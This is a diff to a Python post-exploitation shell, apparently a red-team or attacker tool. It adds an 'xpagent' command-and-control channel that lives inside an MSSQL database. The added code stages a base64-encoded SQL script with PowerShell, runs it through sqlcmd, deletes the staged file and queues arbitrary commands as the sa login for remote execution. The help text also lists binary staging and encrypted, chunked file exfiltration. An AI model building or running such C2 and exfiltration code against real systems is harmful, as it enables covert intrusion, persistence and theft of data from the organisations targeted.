@@ -20,6 +20,11 @@ Built-in commands (case-insensitive):
     xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
     xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
     xpexfil <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  exfil file from MSSQL host via DB channel (AES-256-CBC, chunked)
+    xpagent init                    deploy xpagent in-DB C2 on IIS01 (runs xpagent_init.sql via SB)
+    xpagent kill                    drop xpagent database (cleanup)
+    xpexec <cmd>                    run command via xpagent SB queue, wait for result
+    xpexec-bg <cmd>                 fire-and-forget xpexec (returns cmd_id)
+    xpout <cmd_id>                  read xpagent output rows by cmd_id
     help                            show this help
     exit / quit                     exit the shell
 
@@ -423,6 +428,98 @@ class XpMssql:
                 os.remove(cp)
         print(f"[+] xpexfil done → {out_path}")
 
+    # ── xpagent in-DB C2 channel ─────────────────────────────────────────────
+
+    def cmd_xpagent_init(self, shell, timeout_s: int = 60):
+        """Stage xpagent_init.sql to WS01 and run it via sqlcmd -i on IIS01."""
+        import base64 as _b64, os as _os
+        sql_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "sql", "xpagent_init.sql")
+        try:
+            with open(sql_path, "rb") as fh:
+                b64 = _b64.b64encode(fh.read()).decode()
+        except OSError as e:
+            print(f"[!] xpagent_init: cannot read {sql_path}: {e}")
+            return
+        remote_sql = r"C:\Windows\Temp\xpagent_init.sql"
+        ps_write = (
+            f"[IO.File]::WriteAllBytes('{remote_sql}',"
+            f"[Convert]::FromBase64String('{b64}'))"
+        )
+        print("[*] xpagent_init: staging SQL to WS01 ...")
+        shell.cmd_exec_raw(f'powershell -NoProfile -Command "{ps_write}"')
+        print("[*] xpagent_init: running xpagent_init.sql on IIS01 ...")
+        out = shell.cmd_exec_raw(f"{self._sqlcmd_prefix()} -i {remote_sql}", timeout_s=timeout_s)
+        print(out)
+        shell.cmd_exec_raw(f"cmd /c del /f {remote_sql}")
+        print("[+] xpagent_init done")
+
+    def cmd_xpagent_kill(self, shell):
+        """Drop the xpagent database on IIS01."""
+        tsql = (
+            "USE master; EXECUTE AS LOGIN='sa';"
+            "IF EXISTS (SELECT 1 FROM sys.databases WHERE name=N'xpagent')"
+            " BEGIN ALTER DATABASE xpagent SET SINGLE_USER WITH ROLLBACK IMMEDIATE;"
+            " DROP DATABASE xpagent; END"
+        )
+        out = self._exec_q(shell, tsql)
+        print(out or "[+] xpagent database dropped")
+
+    def _xpagent_insert(self, shell, cmd: str) -> "int | None":
+        """INSERT a command into xpagent.dbo.cmd and return its cmd_id."""
+        insert_out = self._exec_q(shell,
+            "USE xpagent; EXECUTE AS LOGIN='sa';"
+            f"INSERT INTO dbo.cmd (cmd) VALUES (N'{self._tsql_escape(cmd)}');"
+            "SELECT CAST(SCOPE_IDENTITY() AS INT);"
+        )
+        for line in (insert_out or "").splitlines():
+            s = line.strip()
+            if s.isdigit() and int(s) > 0:
+                return int(s)
+        print(f"[!] xpagent: could not get cmd_id — {insert_out!r}")
+        return None
+
+    def cmd_xpexec(self, shell, cmd: str, timeout_s: int = 120):
+        """INSERT command into xpagent queue, poll until done, print output."""
+        cmd_id = self._xpagent_insert(shell, cmd)
+        if cmd_id is None:
+            return
+        print(f"[*] xpexec: cmd_id={cmd_id}, waiting ...")
+        deadline = time.time() + timeout_s
+        status = None
+        while time.time() < deadline:
+            status_out = self._exec_q(shell,
+                f"USE xpagent; EXECUTE AS LOGIN='sa';"
+                f"SELECT status FROM dbo.cmd WHERE id={cmd_id};"
+            )
+            for line in (status_out or "").splitlines():
+                s = line.strip()
+                if s.isdigit():
+                    status = int(s)
+                    break
+            if status in (2, 3):
+                break
+            time.sleep(2)
+        else:
+            print(f"[!] xpexec: timed out (cmd_id={cmd_id}, last status={status})")
+            return
+        self.cmd_xpout(shell, cmd_id)
+
+    def cmd_xpexec_bg(self, shell, cmd: str) -> "int | None":
+        """Fire-and-forget INSERT into xpagent queue; print cmd_id for later xpout."""
+        cmd_id = self._xpagent_insert(shell, cmd)
+        if cmd_id is None:
+            return None
+        print(f"[*] xpexec-bg: queued cmd_id={cmd_id}  (check with: xpout {cmd_id})")
+        return cmd_id
+
+    def cmd_xpout(self, shell, cmd_id: int):
+        """Read and print output rows for a given cmd_id from xpagent.dbo.out."""
+        out = self._exec_q(shell,
+            f"USE xpagent; EXECUTE AS LOGIN='sa';"
+            f"SELECT chunk FROM dbo.out WHERE cmd_id={cmd_id} ORDER BY seq;"
+        )
+        print(out or f"(no output rows for cmd_id={cmd_id})")
+
 
 class ToneShellShell:
     def __init__(self, port: str, debug: bool = False):
@@ -732,6 +829,54 @@ class ToneShellShell:
                         t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
                         c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
                         self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t, chunk_mb=c)
+
+                elif cmd == "xpagent":
+                    sub = parts[1].lower() if len(parts) >= 2 else ""
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    elif sub == "init":
+                        self._xp.cmd_xpagent_init(self)
+                    elif sub == "kill":
+                        self._xp.cmd_xpagent_kill(self)
+                    else:
+                        print("usage: xpagent init|kill")
+
+                elif cmd == "xpexec":
+                    rest = line.split(None, 1)
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(rest) < 2:
+                        print("usage: xpexec <command>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        self._xp.cmd_xpexec(self, rest[1])
+
+                elif cmd == "xpexec-bg":
+                    rest = line.split(None, 1)
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(rest) < 2:
+                        print("usage: xpexec-bg <command>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        self._xp.cmd_xpexec_bg(self, rest[1])
+
+                elif cmd == "xpout":
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(parts) < 2:
+                        print("usage: xpout <cmd_id>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        try:
+                            self._xp.cmd_xpout(self, int(parts[1]))
+                        except ValueError:
+                            print("usage: xpout <cmd_id>  (cmd_id must be an integer)")
 
                 else:
                     if not self.session:
